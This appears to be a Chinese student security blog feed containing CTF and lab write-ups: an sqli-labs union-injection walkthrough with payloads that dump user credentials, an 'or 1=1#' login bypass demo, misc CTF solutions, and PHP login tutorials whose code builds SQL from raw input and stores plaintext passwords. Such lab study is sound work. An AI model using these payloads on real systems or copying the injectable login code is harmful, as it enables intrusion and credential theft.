title="查看后台源码："></a>查看后台源码：</h4><pre><code class="php">&lt;?phpini_set(&quot;display_errors&quot;, 0);echo &quot;&lt;embed src=xsf02.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;?&gt;</code></pre><p>看到和上关比，src多了双引号，不知道这题是啥意思。。。</p><h4 id="通关代码：-16"><a href="#通关代码：-16" class="headerlink" title="通关代码："></a>通关代码：</h4><p>同上</p><h3 id="Level-19-—-20-Flash-xss"><a href="#Level-19-—-20-Flash-xss" class="headerlink" title="Level 19 — 20 Flash xss"></a>Level 19 — 20 Flash xss</h3><p>这两题太难了，暂时先搁着吧 (→_→)</p><p>参考文章：</p><p><a href="https://www.cnblogs.com/ruoli-s/p/14285233.html">https://www.cnblogs.com/ruoli-s/p/14285233.html</a><br><a href="https://blog.csdn.net/qq_41734243/article/details/105991109">https://blog.csdn.net/qq_41734243/article/details/105991109</a><br><a href="https://404sprint.github.io/2020/10/28/xss-labs/">https://404sprint.github.io/2020/10/28/xss-labs/</a><br><a href="https://cloud.tencent.com/developer/article/1665021">https://cloud.tencent.com/developer/article/1665021</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sqli-labs第一题详解</title>
      <link href="2019/06/10/Sqli-labs%E7%AC%AC%E4%B8%80%E9%A2%98%E8%AF%A6%E8%A7%A3/"/>
      <url>2019/06/10/Sqli-labs%E7%AC%AC%E4%B8%80%E9%A2%98%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>less1:<br>根据题目提示为单引号注入，先测试一下<br><img src="https://github.com/weiwanchengdege/photos/blob/master/20190604202334654.png?raw=true" alt="在这里插入图片描述"><br>果然报错了，说明我们添加的单引号被数据库成功解析，那我们就可以通过闭合id这个参数 ,然后构造自己的sql语句进行攻击。一般可以使用联合表的方式来提取自己想要的信息（union），但是使用union语句有个前提就是union 后面的语句必须与前面的语句字段数以及类型必须一直，否则数据库会报错。<br>那么知道这个我们就开始查字段吧<br>确定字段数一般可以使用order by 语句：<br><code>http://localhost/sqlilabs/Less-1/?id=1 order by 1 %23</code><br>执行成功<br><code>http://localhost/sqlilabs/Less-1/?id=1&#39; order by 2 %23</code><br>执行成功<br><code>http://localhost/sqlilabs/Less-1/?id=1&#39; order by 3 %23</code><br>执行成功<br><code>http://localhost/sqlilabs/Less-1/?id=1&#39; order by 4 %23</code><br>报错：<br><img src="https://github.com/weiwanchengdege/photos/blob/master/20190609193657260.png?raw=true" alt="在这里插入图片描述"><br>//注意这里使用  <code>#</code> 是不行的，游览器没有帮我们编码，所以我们自己编<br>   <code>%23</code> 为<code>#</code>的url编码，<code>--+</code>可以直接使用//</p><p>   即只有三个字段，那么现在开始联合查询：<br>   因为sql语句的执行结果<strong>只有第一行</strong>会被回显在页面上，所以我们要把原始语句的的结果        集变为空，这样我们想要的结果才能显示在界面上<br>   同时又需要确定哪几个字段会被显示在页面上：<br><img src="https://github.com/weiwanchengdege/photos/blob/master/20190609195252896.png?raw=true" alt="在这里插入图片描述"><br>   可以看出2，3字段被显示出来，<br>   接着爆数据库<img src="https://github.com/weiwanchengdege/photos/blob/master/20190609195604428.png?raw=true" alt="在这里插入图片描述"><br>   看到数据库名为：<strong>security</strong>，接着再查其他信息<br>   <code>http://localhost/sqli-labs/Less-1/ ?id=&#39;union select 1,2,concat_ws((char(32,58,32)),user(),database(),version())--+</code><br><img src="https://github.com/weiwanchengdege/photos/blob/master/20190609201140811.png?raw=true" alt="在这里插入图片描述"><br>   这里我使用了<strong>concat_ws()</strong> 函数：<br>  concat_ws(separator,str1,str2,…)<br>  第一个参数是其它参数的分隔符。分隔符的位置放在要连 接的两个字符串之间。分隔符可以是一个字符串，也可以是其它参数。<br>es:<br> select concat_ws(‘,’,’11’,’22’,’33’);   　11,22,33<br> **group_concat()**： 使多行数据在一列显示<br> char(32,58,32)对应ascill码为<code>空格：空格</code><br>user():返回当前数据库连接使用的用户<br>database():返回当前数据库连接使用的数据库<br>version():返回当前数据库的版本<br>OK 得到这些信息之后我们再来看看数据库有哪些表</p><pre><code>http://localhost/sqli-labs/Less-1/?id=&#39;union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+</code></pre><p><img src="https://github.com/weiwanchengdege/photos/blob/master/2019060920432537.png?raw=true" alt="在这里插入图片描述"><br>可以看到有四张表，我们想要的信息基本都在<strong>user</strong>表下<br>我们对这张表爆列名：</p><pre><code>http://localhost/sqli-labs/Less-1/?id=0&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; --+</code></pre><p><img src="https://github.com/weiwanchengdege/photos/blob/master/20190609211043656.png?raw=true" alt="在这里插入图片描述"><br>  接着进行爆用户信息</p><pre><code>   http://localhost/sqli-labs/Less-1/?id=&#39; union select 1,group_concat(username),group_concat(password) from users --+</code></pre><p><img src="https://github.com/weiwanchengdege/photos/blob/master/20190609211207363.png?raw=true" alt="在这里插入图片描述"><br>   OKヾ(≧▽≦*)o 第一关到此结束。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
          <category> Sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CRC碰撞</title>
      <link href="2019/05/04/CRC%E7%A2%B0%E6%92%9E/"/>
      <url>2019/05/04/CRC%E7%A2%B0%E6%92%9E/</url>
      
        <content type="html"><![CDATA[<p>一道crc题目 打开后又有三个加密文档，使用脚本碰撞。</p><p><img src="http://img-blog.csdnimg.cn/20190406114959132.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br>对三个文档进行碰撞。<br><img src="http://img-blog.csdnimg.cn/20190406122339590.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"></p><p><img src="http://img-blog.csdnimg.cn/20190406123214216.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"></p><p><img src="http://img-blog.csdnimg.cn/20190406123245738.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br>得到密文you_are_the_best!!输入得到：</p><p><img src="http://img-blog.csdnimg.cn/20190406202243936.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br>判断为base32解码得：flag%7Bwe1come%20to%20shalou%20anquan%7D<br>继续url解码得flag：flag{we1come to shalou anquan}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> crc碰撞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一次团队线下赛总结</title>
      <link href="2019/05/04/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%9B%A2%E9%98%9F%E5%86%85%E9%83%A8%E6%AF%94%E8%B5%9B%E6%80%BB%E7%BB%93/"/>
      <url>2019/05/04/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%9B%A2%E9%98%9F%E5%86%85%E9%83%A8%E6%AF%94%E8%B5%9B%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>这周四团队进行了一次内部比赛，学长让我们进行对各自搭建的登陆注册界面互相进行sql注入攻击，毫无准备的我很快就被打穿了…，唉，无奈代码写太简陋，没有提前准备，体验感极差hhh。。。<hr><br>那么先来了解一下什么是sql注入<br><strong>sql注入定义</strong><br>所谓SQL注入，就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。<br><strong>sql注入原理</strong><br>　 　当用户使用输入内容来构造动态sql语句以访问数据库时，如果代码使用存储过程，而这些存储过程作为包含未筛选的用户输入的 字符串来传递，会发生sql注入。在某些表单中，用户输入的内容直接用来构造动态sql命令，或者作为存储过程的输入参数，这些表单特别容易受到sql注入的攻击。因此，没有对用户输入的合法性进行判断或者程序中本身的变量处理不当，这样，用户就可以提交一段数据库查询的代码， 根据程序返回的结果，获得一些敏感的信息或者控制整个服务器，于是sql注入就发生了。<br>　<strong>如何防护</strong> 　<br>主要有以下几点：<br>1.永远不要信任用户的输入。对用户的输入进行校验，可以通过正则表达式，或限制长度；对单引号和<br>双”-“进行转换等。<br>2.永远不要使用动态拼装sql，可以使用参数化的sql或者直接使用存储过程进行数据查询存取。<br>3.永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。<br>4.不要把机密信息直接存放，加密或者hash掉密码和敏感的信息。<br>5.应用的异常信息应该给出尽可能少的提示，最好使用自定义的错误信息对原始错误信息进行包装<br>6.sql注入的检测方法一般采取辅助软件或网站平台来检测，软件一般采用sql注入检测工具jsky，网站平台就有亿思网站安全平台检测工具。MDCSOFT SCAN等。采用MDCSOFT-IPS可以有效的防御SQL注入，XSS攻击等。<hr></p><p>下面是我的登陆验证代码：</p><pre><code>&lt;?php       $conn=mysql_connect(&quot;localhost&quot;,&#39;root&#39;,&#39;root&#39;) or die(&quot;数据库连接失败！&quot;);//连接你的本地数据库       localhost为服务器 root为用户名 root为密码       mysql_select_db(&#39;myphp&#39;,$conn) or die(&quot;您要选择的数据库不存在&quot;);//选择你建立的数据库       $name=$_POST[&#39;username&#39;];       $pass=$_POST[&#39;password&#39;];//获取表单提交的内容用两个变量来存post方式接受的值       $sql=&quot;select * from user where username=&#39;$name&#39; and password=&#39;$pass&#39;&quot;;//查询语句       $query=mysql_query($sql);//函数执行一条 MySQL 查询。       $arr=mysql_fetch_array($query);然后从$query中取一行数字数组       if(is_array($arr))&#123;//对$arr进行判断              setcookie(&#39;username&#39;,$name,time()+3600);//设置cookie,时间为一小时，（以秒为单位）              header(&quot;Location:index.php&quot;);//跳转页面       &#125;else&#123;              echo &quot;您的用户名或密码输入有误，&lt;a href=\&quot;login.php\&quot;&gt;请重新登录！&lt;/a&gt;&quot;;       &#125;?&gt;</code></pre><p>注意到了没，我们直接将用户提交过来的数据(用户名和密码)直接拿去执行，并没有实现进行特殊字符过滤，待会你将明白，这是致命的。<br>　　代码分析：如果，用户名和密码都匹配成功的话，将跳转到目的操作界面 index.php，不成功，则给出提示信息。<br><strong>演示注入手法</strong><br>     接下来将展开我们的重头戏SQL注入：<br>　　填好正确的用户名(123)和密码(123)后，点击提交，将会返回给我们“登陆成功”的界面。<br>　　因为根据我们提交的用户名和密码被合成到SQL查询语句当中之后是这样的：　　   </p><pre><code> select * from users where username=&#39;123&#39; and password=&#39;123&#39;</code></pre><p>　　      很明显，用户名和密码都和我们之前给出的一样，肯定能够成功登陆。<br>但是，如果我们输入一个错误的用户名或密码呢?很明显，肯定登入不了吧。恩，正常情况下是如此，但是对于有SQL注入漏洞的网站来说，只要构造个特殊的“字符串”，照样能够成功登录。<br>比如在用户名输入框中输入:’or 1=1#,密码随便输入，这时候的合成后的SQL查询语句为：</p><pre><code>select * from users where username=&#39;&#39; or 1=1#&#39; and password=md5(&#39; &#39;)语义分析：“#”在mysql中是注释符，这样#号后面的内容将被mysql视为注释内容，这样就不会去执行了，换句话说，以下的两句sql语句等价：select * from users where username=&#39;&#39; or 1=1#&#39; and password=md5(&#39; &#39;)等价于   select * from users where username=&#39;&#39; or 1=1因为1=1永远都是成立的，即where子句总是为真，将该sql进一步简化之后，等价如下select语句：select * from users</code></pre><p>　　没错，该sql语句的作用是检索users表中的所有字段<br>    果不其然，我们利用万能语句(’or 1=1#)能够登录！看到了吧，一个经构造后的sql语句竟有如此可怕的破坏力，相信你看到这后，开始对sql注入有了一个理性的认识了吧~</p>]]></content>
      
      
      <categories>
          
          <category> 线下赛 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>MISC暴力破解</title>
      <link href="2019/05/04/misc%20%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
      <url>2019/05/04/misc%20%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p>打开为加密文件，果断暴力破解，速度实在太慢，改为字典破解得到口令<img src="https://github.com/weiwanchengdege/photos/blob/master/20190407203235944.png?raw=true" alt="在这里插入图片描述"><br>输入口令得<img src="https://github.com/weiwanchengdege/photos/blob/master/20190407203617747.png?raw=true" alt="在这里插入图片描述"><br>经寻找发现特殊html文档打开<br><img src="https://github.com/weiwanchengdege/photos/blob/master/20190407204134199.png?raw=true" alt="在这里插入图片描述"></p><p>查看网页源代码发现字符串:666c61677b73756d6d6572217d</p><p><img src="https://github.com/weiwanchengdege/photos/blob/master/20190407204500849.jpg?raw=true" alt="在这里插入图片描述">目测为十六进制转字符串解密得：</p><p><img src="https://github.com/weiwanchengdege/photos/blob/master/20190407204917736.png?raw=true"><br>得到flag{summer!}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 暴力破解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP — Cookie and Session篇</title>
      <link href="2019/04/28/PHP%20%E2%80%94%20Cookie%20and%20Session%E7%AF%87/"/>
      <url>2019/04/28/PHP%20%E2%80%94%20Cookie%20and%20Session%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<p><strong>一、Cookie</strong></p><p>例：<code>setcookie(&#39;username&#39;,&#39; $name&#39;,time()+3600);</code></p><p>2.在服务器端读取cookie内容</p><pre><code>$_COOKIEif(!isset($_COOKIE[&#39;username&#39;]))</code></pre><p>3.将多维数组应用到Cookie中</p><pre><code>setcookie(&quot;member[name]&quot;,&#39;薛之谦&#39;)；setcookie(&quot;member[password]&quot;,‘xiaobaixue&#39;)；</code></pre><p>4.删除Cookie</p><pre><code>setcookie(&quot;member&quot;, &#39; &#39;,time() -1);setcookie(&#39;username&#39;,$name,time()-1);</code></pre><p><strong>二、Session</strong><br>    1.开启session</p><pre><code>    session_start();            $_SESSION[&#39;name&#39;]=&#39;薛之谦&#39;    1)开启一个会话            一个客户 到超市里面买东西 办会员卡！    2)打开已经存在的会话            当这个客户 以后再到超市买东西的时候 根据上次办的卡号 买东西！            根据客户端传来的session id 把这个 session id 对应的数据 读取到 $_SESSION这个变量里面        2.    销毁session    session_start();//打开要销毁的数据    session_unset( );//    session_destory();//销毁一个会话的全部数据    setcoookie(session_name(),&#39;&#39;,time()-3600,&#39;/&#39;);//销毁保存在客户端的卡号（session id）</code></pre>]]></content>
      
      
      <categories>
          
          <category> Web开发 </category>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML+MYSQL+PHP搭建带有cookie的登录页面</title>
      <link href="2019/04/21/HTML+MYSQL+PHP%E6%90%AD%E5%BB%BA%E5%B8%A6%E6%9C%89cookie%E7%9A%84%E7%99%BB%E9%99%86%E9%A1%B5%E9%9D%A2/"/>
      <url>2019/04/21/HTML+MYSQL+PHP%E6%90%AD%E5%BB%BA%E5%B8%A6%E6%9C%89cookie%E7%9A%84%E7%99%BB%E9%99%86%E9%A1%B5%E9%9D%A2/</url>
      
        <content type="html"><![CDATA[<p>这周学长给我们布置了新任务，要让我们在一周内搭建一个带有cookie的登陆界面，任务很轻松（才怪），几经波折之后终于弄好了（呜呜呜~），下面总结一下过程。</p><p>在本地搭建一个带有cookie的登陆注册界面需要以下步骤：</p><ul><li>创建数据库</li><li>登陆界面</li><li>注册界面</li></ul><p>大致需要以下PHP文件：<br><img src="https://github.com/weiwanchengdege/photos/blob/master/8NP(0XC%7B8Y1B%60VWQGI85A_3.png?raw=true" alt="在这里插入图片描述"><br><strong>-  使用phpstudy 自带的mysql 创建数据库</strong></p><p>在localhost 点击箭头新建数据库命名为 mysql<br><img src="https://github.com/weiwanchengdege/photos/blob/master/Inked%7B(4%7D%60U$%5BCS%25H(%7DNPJ%604%25YS_LI.jpg?raw=true" alt="在这里插入图片描述"><br>然后在新建数据库中新建一个表，命名为 user，添加新字段，username 和 password ；内容可以先空着<br><img src="https://github.com/weiwanchengdege/photos/blob/master/WOJD~SRJ8M%5DVEYTZ%5DM%60N%25U.png?raw=true" alt="在这里插入图片描述"></p><p> <strong>- 使用HTML编写登陆界面</strong><br> 总流程如下：<br><img src="https://github.com/weiwanchengdege/photos/blob/master/_3%600I1O5X3GIATXXAT4ZY.png?raw=true" alt="在这里插入图片描述"><br>  login.php；代码如下：</p><pre><code> &lt;!DOCTYPE html&gt; &lt;html lang=&#39;zh&#39;&gt; &lt;head&gt; &lt;title&gt; login&lt;/title&gt; &lt;meta charset=&quot;UTF-8&quot;&gt;&lt;style&gt;    body&#123;        background-image:url(&#39;325151.jpg&#39;);        font-size:30px;//字体大小    &#125;    .main&#123;        position:absolute;//全局变量        top:35%;        left:45%;    &#125;    input&#123;        width:250px;        height:30px;        text-align:left;        color:blue;    &#125;    .sub&#123;        width:125px;        height:30px;    &#125;    button&#123;        width:125px;        height:30px;        text-align:left;    &#125;&lt;/style&gt;&lt;/head&gt; &lt;body&gt;  &lt;div class=&quot;main&quot;&gt;&lt;form name=&quot;input&quot; action=&quot;post.php&quot; method=&quot;post&quot;&gt;用户名 ：&lt;br /&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br&gt;密码 ：  &lt;br /&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt; &lt;br&gt;             &lt;input type=&quot;submit&quot; value=&quot;登陆&quot; class=&quot;sub&quot;&gt;             &lt;button&gt;&lt;a href=&quot;reg.php&quot;&gt;注册&lt;/a&gt;&lt;/button&gt;&lt;/form&gt;&lt;/div&gt;&lt;/body&gt; &lt;/html&gt;</code></pre><p>界面如下：<br><img src="https://github.com/weiwanchengdege/photos/blob/master/Microsoft%20Edge%202019_4_20%2023_05_54.png?raw=true" alt="在这里插入图片描述"><br><strong>- 登陆验证：</strong><br>post.php;代码如下</p><pre><code>&lt;?php       $conn=mysql_connect(&quot;localhost&quot;,&#39;root&#39;,&#39;root&#39;) or die(&quot;数据库连接失败！&quot;);//连接你的本地数据库       localhost为服务器 root为用户名 root为密码       mysql_select_db(&#39;myphp&#39;,$conn) or die(&quot;您要选择的数据库不存在&quot;);//选择你建立的数据表       $name=$_POST[&#39;username&#39;];       $pwd=$_POST[&#39;password&#39;];//获取表单提交的内容用两个变量来存post方式接受的值       $sql=&quot;select * from user where username=&#39;$name&#39; and password=&#39;$pwd&#39;&quot;;//查询语句       $query=mysql_query($sql);//函数执行一条 MySQL 查询。       $arr=mysql_fetch_array($query);然后从$query中取一行数字数组       if(is_array($arr))&#123;//对$arr进行判断              setcookie(&#39;username&#39;,$name,time()+3600);//设置cookie,时间为一小时，（以秒为单位）              header(&quot;Location:index.php&quot;);//跳转页面       &#125;else&#123;              echo &quot;您的用户名或密码输入有误，&lt;a href=\&quot;login.php\&quot;&gt;请重新登录！&lt;/a&gt;&quot;;       &#125;?&gt;</code></pre><p><strong>实现注册总流程：</strong><br><img src="https://github.com/weiwanchengdege/photos/blob/master/347(0V6CSGE%7D3$9%5DCD4C~6X.png?raw=true" alt="在这里插入图片描述"></p><p><strong>-注册页面</strong><br><img src="https://github.com/weiwanchengdege/photos/blob/master/Microsoft%20Edge%202019_4_21%2011_21_51.png?raw=true" alt="在这里插入图片描述"><br> reg.php;代码如下：</p><pre><code> &lt;!DOCTYPE html&gt;    &lt;html &gt;    &lt;head&gt;    &lt;title&gt; 注册&lt;/title&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;style&gt;    body&#123;        background-image:url(&#39;323971.jpg&#39;);        background-repeat:no-repeat;        font-size:30px;    &#125;    .main&#123;        position:absolute;        top:35%;        left:45%;    &#125;    input&#123;        text-align:center;        width:250px;        height:30px;        text-align:left;        color:green;    &#125;    .sub&#123;        width:125px;        height:30px;    &#125;    &lt;/style&gt;    &lt;/head&gt;    &lt;body&gt;  &lt;div class=&quot;main&quot;&gt;&lt;form name=&quot;input&quot; action=&quot;regin.php&quot; method=&quot;post&quot;&gt;用户名&lt;br/&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br&gt;密码  &lt;br/&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt; &lt;br&gt;           &lt;input type=&quot;submit&quot; value=&quot;注册&quot; class=&quot;sub&quot;&gt;    &lt;/body&gt;    &lt;/div&gt;    &lt;/html&gt;</code></pre><p>regin.php  ; 注册验证：</p><pre><code> &lt;?php     $conn=mysql_connect(&quot;localhost&quot;,&#39;root&#39;,&#39;root&#39;) or die(&quot;数据库连接失败！&quot;);           mysql_select_db(&#39;myphp&#39;,$conn) or die(&quot;您要选择的数据库不存在&quot;);     $name=trim($_POST[&#39;username&#39;]);    //trim函数，过滤空格，如果不加，我们在用户名后面添加很多空格，提交表单，打开firebug    //调试工具，我们可以到输入的用户名后面会有很多空格，使用trim函数，我们可以把表单中空格给过滤掉     $password=$_POST[&#39;password&#39;];     $sql = &quot;select * from user where username=&#39;$name&#39;&quot;;     $info = mysql_query($sql);     $res = mysql_num_rows($info);    if(empty($name))&#123;        echo &quot;&lt;script&gt;alert(&#39;用户名不能为空&#39;);location.href=&#39;reg.php&#39;;&lt;/script&gt;&quot;;    &#125;else if(empty($password))&#123;        echo &quot;&lt;script&gt;alert(&#39;密码不能为空&#39;);location.href=&#39;reg.php&#39;;&lt;/script&gt;&quot;;    &#125;else&#123;            if($res)&#123;            echo &quot;&lt;script&gt;alert(&#39;用户名已存在&#39;);location.href=&#39;reg.php&#39;;&lt;/script&gt;&quot;;        &#125;else&#123;            $sql1 =&quot;insert into user(username,password) values(&#39;&quot;.$name.&quot;&#39;,&#39;&quot; .($password).&quot;&#39;)&quot;;            $result = mysql_query($sql1);            if($result)&#123;                     echo &quot;&lt;script&gt;alert(&#39;注册成功&#39;)&lt;/script&gt;&quot;,header(&quot;Location:login.php&quot;);;            &#125;else&#123;                     echo &quot;&lt;script&gt;alert(&#39;注册失败&#39;)&lt;/script&gt;&quot;;            &#125;        &#125;&#125;    ?&gt;                                           </code></pre><p><strong>- 登陆成功界面</strong><br><img src="https://github.com/weiwanchengdege/photos/blob/master/J%7B~ID%25BBDF9GON9%60_AN4IN.png?raw=true" alt="在这里插入图片描述"><br>代码如下：</p><pre><code> &lt;?php    if(!isset($_COOKIE[&#39;username&#39;]))//对跳转方式判断，阻止直接跳转；    &#123;        echo &#39;登录非法!&lt;a href=&quot;login.php&quot;&gt;请登录&lt;/a&gt;&#39;;        exit();    &#125; ?&gt; &lt;!DOCTYPE html&gt;    &lt;html &gt;    &lt;head&gt;    &lt;title&gt; welcome! &lt;/title&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;/head&gt;    &lt;body&gt;     Hello 靓仔!   &lt;a href=&quot;logout.php&quot;&gt;注销&lt;/a&gt;//点击“ 注销 ”跳转页面    &lt;/body&gt;    &lt;/html&gt;</code></pre><p><strong>- 注销 cookie</strong><br>logout.php:<br>代码如下：</p><pre><code>&lt;?php    if(isset($_COOKIE[&#39;username&#39;]))&#123;        setcookie(&#39;username&#39;,$name,time()-1);//清除cookie 将时间设置为负数        header(&#39;Location:login.php&#39;);    &#125;    else&#123;        echo &#39;注销失败&#39;;        header(&#39;Location:index.php&#39;);    &#125;?&gt;</code></pre><hr>以上就是利用phpstudy搭建带有cookie 的登录注册界面的全过程，希望这篇文章可以帮助别人，同时也防止自己遗忘。]]></content>
      
      
      <categories>
          
          <category> Web开发 </category>
          
          <category> PHP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>双图+盲水印</title>
      <link href="2019/04/16/%E5%8F%8C%E5%9B%BE+%E7%9B%B2%E6%B0%B4%E5%8D%B0/"/>
      <url>2019/04/16/%E5%8F%8C%E5%9B%BE+%E7%9B%B2%E6%B0%B4%E5%8D%B0/</url>
      
        <content type="html"><![CDATA[<p><strong>1.双图</strong><br>打开压缩包，发现有两张图片 first1和second.png，使用Stegsolve打开first1.png进行一次异或处理</p><p><img src="https://github.com/weiwanchengdege/photos/blob/master/20190408201207778.png?raw=true" alt="在这里插入图片描述"><br>然后分析选择结合second.png得到<br><img src="https://github.com/weiwanchengdege/photos/blob/master/20190408201646144.png?raw=true" alt="在这里插入图片描述"><br>用stegslove对二维码进行运算得到三张二维码</p><p><img src="https://github.com/weiwanchengdege/photos/blob/master/20190408201910360.png?raw=true" alt="在这里插入图片描述"><br><img src="https://github.com/weiwanchengdege/photos/blob/master/201904082020166.png?raw=true" alt="在这里插入图片描述"><br><img src="https://github.com/weiwanchengdege/photos/blob/master/20190408202109348.png?raw=true" alt="在这里插入图片描述"><br>扫描结果是DES 6XaMMbM7<br>和一长串字符，很显然是des加密，秘钥是6XaMMbM7，然后对长串字符进行DES解密，得到flag。<br><strong>2.盲水印</strong><br>据提示为盲水印题打开有两张图片<br><img src="https://github.com/weiwanchengdege/photos/blob/master/20190408202952565.png?raw=true" alt="在这里插入图片描述"><br>所以使用bwm脚本（python2）bwm脚本的<a href="https://github.com/chishaxie/BlindWaterMark">github</a>,如果没有cv2这个模块，使用下面的命令安装cv2</p><pre><code>pip install opencv-python</code></pre><p>然后运行<code>python bwm.py decode 1.png 2.png flag.png</code><br>其中1.png和2.png是解压所得图片，flag.png是所分离出来的水印。<br>由于加密方式不同，所以未能得到水印图。<br>于是推测为软件添加的水印使用watermark工具进行破解<a href="https://www.anxz.com/down/10929.html">软件下载</a><br>得到水印图：<img src="https://github.com/weiwanchengdege/photos/blob/master/20190408204103908.png?raw=true"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 盲水印 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>哈夫曼树+TTL+密码题</title>
      <link href="2019/04/15/%E5%93%88%E5%A4%AB%E6%9B%BC%E6%A0%91+%E5%AF%86%E7%A0%81%E9%A2%98+TTL/"/>
      <url>2019/04/15/%E5%93%88%E5%A4%AB%E6%9B%BC%E6%A0%91+%E5%AF%86%E7%A0%81%E9%A2%98+TTL/</url>
      
        <content type="html"><![CDATA[<p>这周又做了几道题，挺有意思的，记录下。<br><strong>一 .奇怪的TTL</strong><br> 至于什么是TTL，我给大家解释下：IP报文在路由间穿梭的时候每经过一个路由，TTL就会减1，当TTL为0的时候，该报文就会被丢弃。TTL所占的位数是8位，也就是0-255的范围，但是在大多数情况下通常只需要经过很小的跳数就能完成报文的转发，远远比上限255小得多，所以我们可以用TTL值的前两位来进行传输隐藏数据<br>如：须传送H字符，只需把H字符换成二进制，每两位为一组，每次填充到TTL字段的开头两位并把剩下的6位设置为1（xx111111），这样发4个IP报文即可传送1个字节。（摘抄···）<br>了解了这些之后开始做题。<hr><br>打开有两个txt文档<br><img src="https://github.com/weiwanchengdege/photos/blob/master/Z3HGLJJWTYLU%5B7Y306VOU7W.png?raw=true" alt="在这里插入图片描述"><br>题目描述如下：<br>我们截获了一些IP数据报，发现报文头中的TTL值特别可疑，怀疑是通信方嵌入了数据到TTL，我们将这些TTL值提取了出来，你能看出什么端倪吗？<br>打开文档：</p><p><img src="https://github.com/weiwanchengdege/photos/blob/master/20190408114948666705.png?raw=true" alt="在这里插入图片描述"><br>txt文件里面有很多列ttl值，63,127,191,255<br>63== 00111111<br>127==01111111<br>191==10111111<br>255==11111111<br>变得只有前面两位，后面6位不变，如果传输4个就是一字节<br>使用脚本提取<br>(大佬的脚本)</p><pre><code>fp = open(&#39;ttl.txt&#39;,&#39;r&#39;)a = fp.readlines()p = []for i in a:    p.append(int(i[4:]))s = &#39;&#39;for i in p:    if i == 63:        a = &#39;00&#39;    elif i == 127:        a = &#39;01&#39;    elif i == 191:        a = &#39;10&#39;    elif i == 255:        a = &#39;11&#39;    s += a# print(s)import binasciiflag = &#39;&#39;for i in range(0,len(s),8):    flag += chr(int(s[i:i+8],2))flag = binascii.unhexlify(flag)wp = open(&#39;res.jpg&#39;,&#39;wb&#39;)wp.write(flag)wp.close()#00111111 63#01111111 127#10111111 191#11111111 255</code></pre><p>得到：<img src="https://img-blog.csdnimg.cn/20190414202949301.jpg" alt="在这里插入图片描述"><br>写完之后发现只有二维码的一部分，应该是不止一张图，用foremost直接分开就好了，之后用ps拼在一块<br><a href="http://www.mamicode.com/info-detail-2283219.html">foremost下载及使用说明</a><br><img src="https://github.com/weiwanchengdege/photos/blob/master/E2%25YM%7D%7D24~101AHU~2BMJBT.png?raw=true" alt="在这里插入图片描述"><br>得到六张图：<img src="https://github.com/weiwanchengdege/photos/blob/master/A~S%7D6A7UL@UH6Z$V@3$ABUF.png?raw=true" alt="在这里插入图片描述"><br>使用PS拼接：<img src="https://github.com/weiwanchengdege/photos/blob/master/OWO_%5BRDO@" 